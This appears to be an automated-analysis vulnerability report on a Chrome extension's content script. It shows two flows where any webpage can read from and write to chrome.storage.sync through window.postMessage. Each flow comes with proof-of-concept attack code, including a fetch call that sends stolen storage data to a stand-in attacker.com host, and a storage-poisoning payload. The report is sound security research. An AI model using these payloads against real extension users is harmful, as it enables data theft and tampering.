# CoCo Analysis: hebabhddakflgmlhgefakkfkciijliie

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: storage_sync_get_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hebabhddakflgmlhgefakkfkciijliie/opgen_generated_files/cs_0.js
Line 395: 'key': 'value'

**Code:**

```javascript
// Content script (cs_0.js) - Complete flow
function getStorageValue(key, callback) {
    chrome.storage.sync.get(key, function(values) {
        callback(values[key]); // ← storage data retrieved
    });
}

// Entry point - window.postMessage listener
window.addEventListener("message", function(event) {
    if (event.source != window) {
        return;
    }

    // Attacker triggers storage read with controlled key
    if (event.data.type && (event.data.type == "getStorageValue")) {
        getStorageValue(event.data.key, function(value) {
            // ← Storage data sent back to attacker via postMessage
            window.postMessage({ type: "retrievedStorageValue", key: event.data.key, value: value }, "*");
        })
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (DOM event)

**Attack:**

```javascript
// Malicious webpage triggers storage read and receives data back
window.postMessage({ type: "getStorageValue", key: "sensitiveKey" }, "*");

// Listen for response
window.addEventListener("message", function(event) {
    if (event.data.type === "retrievedStorageValue") {
        console.log("Stolen storage data:", event.data.value);
        // Exfiltrate to attacker server
        fetch("https://attacker.com/collect", {
            method: "POST",
            body: JSON.stringify(event.data)
        });
    }
});
```

**Impact:** Information disclosure - attacker can read any data from chrome.storage.sync by controlling the key parameter and receiving the stored values back via postMessage.

---

## Sink 2: cs_window_eventListener_message → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hebabhddakflgmlhgefakkfkciijliie/opgen_generated_files/cs_0.js
Line 480: window.addEventListener("message", function(event) {
Line 485: if (event.data.type && (event.data.type == "getStorageValue")) {
Line 492: setStorageValue(event.data.key, event.data.value);

**Code:**

```javascript
// Content script (cs_0.js) - Complete flow
function setStorageValue(key, value) {
    var object = {};
    object[key] = value; // ← attacker-controlled key and value
    chrome.storage.sync.set(object); // ← sink
}

// Entry point - window.postMessage listener
window.addEventListener("message", function(event) {
    if (event.source != window) {
        return;
    }

    // Attacker triggers storage write with controlled data
    if (event.data.type && (event.data.type == "setStorageValue")) {
        setStorageValue(event.data.key, event.data.value); // ← attacker-controlled
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (DOM event)

**Attack:**

```javascript
// Malicious webpage poisons storage with arbitrary data
window.postMessage({
    type: "setStorageValue",
    key: "maliciousKey",
    value: "maliciousValue"
}, "*");

// Combined with Sink 1 - complete storage exploitation chain:
// 1. Write malicious data
window.postMessage({
    type: "setStorageValue",
    key: "config",
    value: "https://attacker.com/evil"
}, "*");

// 2. Read it back to confirm
window.postMessage({ type: "getStorageValue", key: "config" }, "*");

window.addEventListener("message", function(event) {
    if (event.data.type === "retrievedStorageValue") {
        console.log("Confirmed poisoned data:", event.data.value);
    }
});
```

**Impact:** Complete storage exploitation chain - attacker can write arbitrary data to chrome.storage.sync (storage poisoning) AND read it back via Sink 1 (information disclosure), achieving full storage control. This enables both data manipulation and exfiltration.

---

**Note:** Both flows exist in the actual extension code (after line 465 "// original file:/home/teofanescu/cwsCoCo/extensions_local/hebabhddakflgmlhgefakkfkciijliie/script.js"). The extension has "storage" permission in manifest.json. The content script runs on "*://*/go/pipelines*" and "*://*/go/home*", making it exploitable on those URL patterns.
